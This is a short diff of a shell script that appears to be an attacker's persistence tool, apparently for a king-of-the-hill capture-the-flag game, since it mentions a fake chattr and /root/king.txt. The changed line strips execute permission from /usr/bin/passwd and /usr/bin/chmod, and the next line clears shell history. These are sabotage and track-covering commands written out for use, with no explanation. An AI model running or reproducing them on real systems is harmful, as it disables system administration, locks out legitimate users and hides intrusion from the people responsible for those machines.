@@ -58,7 +58,7 @@ echo
 echo "------------------Fake chattr successfully added-----------------"
 echo "-----------------------------------------------------------------"
 echo
-chmod -x /usr/bin/passwd && chmod -x /usr/bin/chmod
+chmod +x /root/king.txt && chmod -x /usr/bin/passwd && chmod -x /usr/bin/chmod
 history -c
 echo
 echo "-----------------------------------------------------------------------------"
